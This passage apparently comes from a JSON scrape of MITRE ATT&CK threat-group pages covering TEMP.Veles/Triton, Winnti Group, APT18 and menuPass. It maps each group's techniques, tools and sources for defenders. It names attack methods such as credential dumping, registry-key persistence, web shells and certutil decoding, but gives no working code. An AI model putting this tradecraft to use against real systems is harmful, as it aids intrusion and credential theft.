Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Server Software Component: Web Shell, Valid Accounts C0030 Triton Safety Instrumented System Attack June 2017 [6] August 2017 [6] [2][7] Active Scanning, Adversary-in-the-Middle, Command and Scripting Interpreter: PowerShell, Command-Line Interface, Develop Capabilities: Malware, Encrypted Channel, Indicator Removal on Host, Input Capture: Web Portal Capture, Lateral Tool Transfer, Loss of Productivity and Revenue, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Indicator Removal from Tools, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, Program Download, Remote Services, Scheduled Task/Job: Scheduled Task, Scripting, Unauthorized Command Message, Valid Accounts Techniques Used Domain ID Name Use Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server During the C0032 campaign, TEMP.Veles used Virtual Private Server (VPS) infrastructure.[1] Enterprise T1595 Active Scanning In the Triton Safety Instrumented System Attack, TEMP.Veles engaged in network reconnaissance against targets of interest.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.[2] During the C0032 campaign, TEMP.Veles used PowerShell to perform timestomping.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.[1] Enterprise T1587 .001 Develop Capabilities: Malware In the Triton Safety Instrumented System Attack, TEMP.Veles developed, prior to the attack, malware capabilities that would require access to specific and specialized hardware and software.[7] Enterprise T1573 Encrypted Channel In the Triton Safety Instrumented System Attack, TEMP.Veles used cryptcat binaries to encrypt their traffic.[2] Enterprise T1546 .012 Event Triggered Execution: Image File Execution Options Injection During the C0032 campaign, TEMP.Veles modified and added entries within HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options to maintain persistence.[1] Enterprise T1133 External Remote Services During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment.[1] Enterprise T1070 .004 Indicator Removal: File Deletion During the C0032 campaign, TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.[1] .006 Indicator Removal: Timestomp During the C0032 campaign, TEMP.Veles used timestomping to modify the $STANDARD_INFORMATION attribute on tools.[1] Enterprise T1056 .003 Input Capture: Web Portal Capture In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled.[6] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location In the Triton Safety Instrumented System Attack, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files. During the C0032 campaign, TEMP.Veles renamed files to look like legitimate files, such as Windows update files or Schneider Electric application files.[1] Enterprise T1571 Non-Standard Port During the C0032 campaign, TEMP.Veles used port-protocol mismatches on ports such as 443, 4444, 8531, and 50501 during C2.[1] Enterprise T1027 .005 Obfuscated Files or Information: Indicator Removal from Tools In the Triton Safety Instrumented System Attack, TEMP.Veles modified files based on the open-source project cryptcat in an apparent attempt to decrease anti-virus detection rates.[2] Enterprise T1588 .002 Obtain Capabilities: Tool In the Triton Safety Instrumented System Attack, TEMP.Veles used tools such as Mimikatz and other open-source software.[2] During the C0032 campaign, TEMP.Veles obtained and used tools such as Mimikatz and PsExec.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory In the Triton Safety Instrumented System Attack, TEMP.Veles used Mimikatz.[8] During the C0032 campaign, TEMP.Veles used Mimikatz and a custom tool, SecHack, to harvest credentials.[1] Enterprise T1572 Protocol Tunneling During the C0032 campaign, TEMP.Veles used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During the C0032 campaign, TEMP.Veles utilized RDP throughout an operation.[1] .004 Remote Services: SSH During the C0032 campaign, TEMP.Veles relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task In the Triton Safety Instrumented System Attack, TEMP.Veles installed scheduled tasks defined in XML files.[2] During the C0032 campaign, TEMP.Veles used scheduled task XML triggers.[1] Enterprise T1505 .003 Server Software Component: Web Shell During the C0032 campaign, TEMP.Veles planted Web shells on Outlook Exchange servers.[1] Enterprise T1078 Valid Accounts During the C0032 campaign, TEMP.Veles used compromised VPN accounts.[1] ICS T0830 Adversary-in-the-Middle In the Triton Safety Instrumented System Attack, TEMP.Veles changed phone numbers tied to certain specific accounts in a designated contact list. They then used the changed phone numbers to redirect network traffic to websites controlled by them, thereby allowing them to capture and use any login codes sent to the devices via text message.[6] ICS T0807 Command-Line Interface In the Triton Safety Instrumented System Attack, TEMP.Veles\u2019 tool took one option from the command line, which was a single IP address of the target Triconex device.[7] ICS T0817 Drive-by Compromise TEMP.Veles utilizes watering hole websites to target industrial employees. [9] ICS T0872 Indicator Removal on Host In the Triton Safety Instrumented System Attack, TEMP.Veles would programmatically return the controller to a normal running state if the Triton malware failed. If the controller could not recover in a defined time window, TEMP.Veles programmatically overwrote their malicious program with invalid data.[7] ICS T0867 Lateral Tool Transfer In the Triton Safety Instrumented System Attack, TEMP.Veles made attempts on multiple victim machines to transfer and execute the WMImplant tool.[2] ICS T0828 Loss of Productivity and Revenue In the Triton Safety Instrumented System Attack, TEMP.Veles tripped a controller into a failed safe state, which caused an automatic shutdown of the plant, this resulted in a pause of plant operations for more than a week. Thereby impacting industrial processes and halting productivity.[7] ICS T0843 Program Download In the Triton Safety Instrumented System Attack, TEMP.Veles downloaded multiple rounds of control logic to the Safety Instrumented System (SIS) controllers through a program append operation.[7] ICS T0886 Remote Services In the Triton Safety Instrumented System Attack, TEMP.Veles utilized remote desktop protocol (RDP) jump boxes, poorly configured OT firewalls [6], along with other traditional malware backdoors, to move into the ICS environment.[8][6] ICS T0853 Scripting In the Triton Safety Instrumented System Attack, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.[2] ICS T0862 Supply Chain Compromise TEMP.Veles targeted several ICS vendors and manufacturers. [10] ICS T0855 Unauthorized Command Message In the Triton Safety Instrumented System Attack, TEMP.Veles leveraged Triton to send unauthorized command messages to the Triconex safety controllers.[8] ICS T0859 Valid Accounts In the Triton Safety Instrumented System Attack, TEMP.Veles used valid credentials when laterally moving through RDP jump boxes into the ICS environment.[8] Software ID Name References Techniques S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0029 PsExec [1][4] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1009 Triton [4] Change Operating Mode, Commonly Used Port, Detect Operating Mode, Execution through API, Exploitation for Evasion, Exploitation for Privilege Escalation, Hooking, Indicator Removal on Host, Loss of Safety, Masquerading, Modify Controller Tasking, Native API, Program Download, Program Upload, Remote System Discovery, Scripting, Standard Application Layer Protocol, System Firmware References Miller, S, et al. (2019, April 10). TRITON Actor TTP Profile, Custom Attack Tools, Detections, and ATT&CK Mapping. Retrieved April 16, 2019. FireEye Intelligence . (2018, October 23). TRITON Attribution: Russian Government-Owned Lab Most Likely Built Custom Intrusion Tools for TRITON Attackers. Retrieved April 16, 2019. Miller, S., et al. (2019, April 10). TRITON Appendix C. Retrieved April 29, 2019. Dragos, Inc.. (n.d.). Xenotime. Retrieved April 16, 2019. Slowik, J.. (2019, April 12). A XENOTIME to Remember: Veles in the Wild. Retrieved April 16, 2019. Blake Sobczak. (2019, March 7). The inside story of the world\u2019s most dangerous malware. Retrieved March 25, 2024. Blake Johnson, Dan Caban, Marina Krotofil, Dan Scali, Nathan Brubaker, Christopher Glyer. (2017, December 14). Attackers Deploy New ICS Attack Framework \u201cTRITON\u201d and Cause Operational Disruption to Critical Infrastructure. Retrieved January 12, 2018. Miller, S. Reese, E. (2018, June 7). A Totally Tubular Treatise on TRITON and TriStation. Retrieved November 17, 2024. Chris Bing 2018, May 24 Trisis masterminds have expanded operations to target U.S. industrial firms Retrieved. 2020/01/03 Dragos Threat Intelligence 2019, August Global Oil and Gas Cyber Threat Perspective Retrieved. 2020/01/03 "
},
{
"id": 171,
"title": "Winnti Group, Blackfly, Group G0044",
"path": "/groups/G0044/index.html",
"content": " Winnti Group Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.[1][2][3] Some reporting suggests a number of other groups, including Axiom, APT17, and Ke3chang, are closely linked to Winnti Group.[4] ID: G0044 \u24d8 Associated Groups: Blackfly Contributors: Edward Millington Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Blackfly [5] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Winnti Group has registered domains for C2 that mimicked sites of their intended targets.[1] Enterprise T1083 File and Directory Discovery Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts.[1] Enterprise T1105 Ingress Tool Transfer Winnti Group has downloaded an auxiliary program named ff.exe to infected machines.[1] Enterprise T1057 Process Discovery Winnti Group looked for a specific process running on infected servers.[1] Enterprise T1014 Rootkit Winnti Group used a rootkit to modify typical server functionality.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Winnti Group used stolen certificates to sign its malware.[1] Software ID Name References Techniques S0501 PipeMon [6] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Create Process with Token, Access Token Manipulation: Parent PID Spoofing, Boot or Logon Autostart Execution: Print Processors, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Fallback Channels, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Fileless Storage, Process Discovery, Process Injection: Dynamic-link Library Injection, Shared Modules, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Time Discovery S0013 PlugX [1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0141 Winnti for Windows [1][2] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Environmental Keying, File and Directory Discovery, Indicator Removal: File Deletion, Indicator Removal: Timestomp, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Proxy: External Proxy, Proxy: Internal Proxy, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution References Kaspersky Lab's Global Research and Analysis Team. (2013, April 11). Winnti. More than just a game. Retrieved February 8, 2017. Tarakanov, D. (2015, June 22). Games are over: Winnti is now targeting pharmaceutical companies. Retrieved January 14, 2016. Novetta Threat Research Group. (2015, April 7). Winnti Analysis. Retrieved February 8, 2017. Hegel, T. (2018, May 3). Burning Umbrella: An Intelligence Report on the Winnti Umbrella and Associated State-Sponsored Attackers. Retrieved July 8, 2018. DiMaggio, J. (2016, March 15). Suckfly: Revealing the secret life of your code signing certificates. Retrieved August 3, 2016. Tartare, M. et al. (2020, May 21). No \u201cGame over\u201d for the Winnti Group. Retrieved August 24, 2020. "
},
{
"id": 172,
"title": "APT18, TG-0416, Dynamite Panda, Threat Group-0416, Group G0026",
"path": "/groups/G0026/index.html",
"content": " APT18 APT18 is a threat group that has operated since at least 2009 and has targeted a range of industries, including technology, manufacturing, human rights groups, government, and medical. [1] ID: G0026 \u24d8 Associated Groups: TG-0416, Dynamite Panda, Threat Group-0416 Version: 2.2 Created: 31 May 2017 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description TG-0416 [2][3] Dynamite Panda [2][3] Threat Group-0416 [2] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT18 uses HTTP for C2 communications.[4] .004 Application Layer Protocol: DNS APT18 uses DNS for C2 communications.[4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT18 establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key.[3][4] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell APT18 uses cmd.exe to execute commands on the victim\u2019s machine.[4][3] Enterprise T1133 External Remote Services APT18 actors leverage legitimate credentials to log into external remote services.[5] Enterprise T1083 File and Directory Discovery APT18 can list files information for specific directories.[4] Enterprise T1070 .004 Indicator Removal: File Deletion APT18 actors deleted tools and batch files from victim systems.[1] Enterprise T1105 Ingress Tool Transfer APT18 can upload a file to the victim\u2019s machine.[4] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File APT18 obfuscates strings in the payload.[4] Enterprise T1053 .002 Scheduled Task/Job: At APT18 actors used the native at Windows task scheduler tool to use scheduled tasks for execution on a victim network.[1] Enterprise T1082 System Information Discovery APT18 can collect system information from the victim\u2019s machine.[4] Enterprise T1078 Valid Accounts APT18 actors leverage legitimate credentials to log into external remote services.[5] Software ID Name References Techniques S0106 cmd [1] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S0032 gh0st RAT [5] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0071 hcdLoader [1][2] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service S0070 HTTPBrowser [5] Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information S0124 Pisloader [6] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information, System Information Discovery, System Network Configuration Discovery References Carvey, H.. (2014, September 2). Where you AT?: Indicators of lateral movement using at.exe on Windows 7 systems. Retrieved January 25, 2016. Shelmire, A.. (2015, July 6). Evasive Maneuvers. Retrieved January 22, 2016. Shelmire, A. (2015, July 06). Evasive Maneuvers by the Wekby group with custom ROP-packing and DNS covert channels. Retrieved November 15, 2018. Grunzweig, J., et al. (2016, May 24). New Wekby Attacks Use DNS Requests As Command and Control Mechanism. Retrieved November 15, 2018. Adair, S. (2017, February 17). Detecting and Responding to Advanced Threats within Exchange Environments. Retrieved November 17, 2024. Grunzweig, J., et al. (2016, May 24). New Wekby Attacks Use DNS Requests As Command and Control Mechanism. Retrieved August 17, 2016. "
},
{
"id": 173,
"title": "menuPass, Cicada, POTASSIUM, Stone Panda, APT10, Red Apollo, CVNX, HOGFISH, BRONZE RIVERSIDE, Group G0045",
"path": "/groups/G0045/index.html",
"content": " menuPass menuPass is a threat group that has been active since at least 2006. Individual members of menuPass are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.[1][2] menuPass has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.[3][4][5][6][7][1][2] ID: G0045 \u24d8 Associated Groups: Cicada, POTASSIUM, Stone Panda, APT10, Red Apollo, CVNX, HOGFISH, BRONZE RIVERSIDE Contributors: Edward Millington; Michael Cox Version: 3.0 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Cicada [8] POTASSIUM [1][2] Stone Panda [3][9][1][2][8] APT10 [3][9][10][1][8] Red Apollo [6][1][2] CVNX [6][1][2] HOGFISH [9] BRONZE RIVERSIDE [11] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.[12] Enterprise T1583 .001 Acquire Infrastructure: Domains menuPass has registered malicious domains for use in intrusion campaigns.[1][2] Enterprise T1560 Archive Collected Data menuPass has encrypted files and information before exfiltration.[1][2] .001 Archive via Utility menuPass has compressed files before exfiltration using TAR and RAR.[6][12][8] Enterprise T1119 Automated Collection menuPass has used the Csvde tool to collect Active Directory files and data.[8] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell menuPass uses PowerSploit to inject shellcode into PowerShell.[12][8] .003 Command and Scripting Interpreter: Windows Command Shell menuPass executes commands using a command-line interface and reverse shell. The group has used a modified version of pentesting script wmiexec.vbs to execute commands.[6][12][13][10] menuPass has used malicious macros embedded inside Office documents to execute files.[9][10] Enterprise T1005 Data from Local System menuPass has collected various files from the compromised computers.[1][8] Enterprise T1039 Data from Network Shared Drive menuPass has collected data from remote systems by mounting network shares with net use and using Robocopy to transfer data.[6] Enterprise T1074 .001 Data Staged: Local Data Staging menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin.[6] .002 Data Staged: Remote Data Staging menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration.[6][8] Enterprise T1140 Deobfuscate/Decode Files or Information menuPass has used certutil in a macro to decode base64-encoded content contained in a dropper document attached to an email. The group has also used certutil -decode to decode files on the victim\u2019s machine when dropping UPPERCUT.[9][10] Enterprise T1568 .001 Dynamic Resolution: Fast Flux DNS menuPass has used dynamic DNS service providers to host malicious domains.[2] Enterprise T1190 Exploit Public-Facing Application menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions.[14] Enterprise T1210 Exploitation of Remote Services menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).[8] Enterprise T1083 File and Directory Discovery menuPass has searched compromised systems for folders of interest including those related to HR, audit and expense, and meeting memos.[8] Enterprise T1574 .001 Hijack Execution Flow: DLL menuPass has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as UPPERCUT.[12][10][8] menuPass has also used DLL search order hijacking.[6] Enterprise T1070 .003 Indicator Removal: Clear Command History menuPass has used Wevtutil to remove PowerShell execution logs.[14] .004 Indicator Removal: File Deletion A menuPass macro deletes files after it has decoded and decompressed them.[9][2] Enterprise T1105 Ingress Tool Transfer menuPass has installed updates and new malware on victims.[6][2] Enterprise T1056 .001 Input Capture: Keylogging menuPass has used key loggers to steal usernames and passwords.[2] Enterprise T1036 Masquerading menuPass has used esentutl to change file extensions to their true type that were masquerading as .txt files.[10] .003 Rename Legitimate Utilities menuPass has renamed certutil and moved it to a different location on the system to avoid detection based on use of the tool.[10] .005 Match Legitimate Resource Name or Location menuPass has been seen changing malicious files to appear legitimate.[2] Enterprise T1106 Native API menuPass has used native APIs including GetModuleFileName, lstrcat, CreateFile, and ReadFile.[8] Enterprise T1046 Network Service Discovery menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.[12] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File menuPass has encoded strings in its malware with base64 as well as with a simple, single-byte XOR obfuscation using key 0x40.[9][10][8] Enterprise T1588 .002 Obtain Capabilities: Tool menuPass has used and modified open-source tools like Impacket, Mimikatz, and pwdump.[12] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[12][13] .003 OS Credential Dumping: NTDS menuPass has used Ntdsutil to dump credentials.[8] .004 OS Credential Dumping: LSA Secrets menuPass has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.[12][13] Enterprise T1566 .001 Phishing: Spearphishing Attachment menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.[12][7][10][2] Enterprise T1055 .012 Process Injection: Process Hollowing menuPass has used process hollowing in iexplore.exe to load the RedLeaves implant.[9] Enterprise T1090 .002 Proxy: External Proxy menuPass has used a global service provider's IP as a proxy for C2 traffic from a victim.[7][10] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol menuPass has used RDP connections to move across the victim network.[6][2] .004 Remote Services: SSH menuPass has used Putty Secure Copy Client (PSCP) to transfer data.[6] Enterprise T1018 Remote System Discovery menuPass uses scripts to enumerate IP ranges on the victim network. menuPass has also issued the command net view /domain to a PlugX implant to gather information about remote systems on the network.[12][7] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task menuPass has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.[12] Enterprise T1553 .002 Subvert Trust Controls: Code Signing menuPass has resized and added data to the certificate table to enable the signing of modified files with legitimate signatures.[14] Enterprise T1218 .004 System Binary Proxy Execution: InstallUtil menuPass has used InstallUtil.exe to execute malicious software.[12] Enterprise T1016 System Network Configuration Discovery menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.[12] Enterprise T1049 System Network Connections Discovery menuPass has used net use to conduct connectivity checks to machines.[6] Enterprise T1199 Trusted Relationship menuPass has used legitimate access granted to Managed Service Providers in order to access victims of interest.[12][7][8][1][2] Enterprise T1204 .002 User Execution: Malicious File menuPass has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.[12][7][9][10][2] Enterprise T1078 Valid Accounts menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[6][8][2][14] Enterprise T1047 Windows Management Instrumentation menuPass has used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[12][13][8] Software ID Name References Techniques S0552 AdFind [8] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0160 certutil [9][10][8] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0144 ChChes [12] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Process Discovery, Subvert Trust Controls: Code Signing, System Information Discovery S0106 cmd [12] Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Lateral Tool Transfer, System Information Discovery S0154 Cobalt Strike [14] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0624 Ecipekac [14] Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Ingress Tool Transfer, Obfuscated Files or Information, Subvert Trust Controls: Code Signing S0404 esentutl [10] Data from Local System, Direct Volume Access, Hide Artifacts: NTFS File Attributes, Ingress Tool Transfer, Lateral Tool Transfer, OS Credential Dumping: NTDS S0152 EvilGrab [12] Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Input Capture: Keylogging, Screen Capture, Video Capture S0628 FYAnti [14] Deobfuscate/Decode Files or Information, File and Directory Discovery, Ingress Tool Transfer, Obfuscated Files or Information: Software Packing S1097 HUI Loader [11] Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Impair Defenses: Indicator Blocking S0357 Impacket [12] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0002 Mimikatz [12] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [12] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0626 P8RAT [14] Data Obfuscation: Junk Data, Ingress Tool Transfer, Process Discovery, Virtualization/Sandbox Evasion: Time Based Evasion, Virtualization/Sandbox Evasion: System Checks S0097 Ping [12][7] Remote System Discovery S0013 PlugX [12][7][1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections 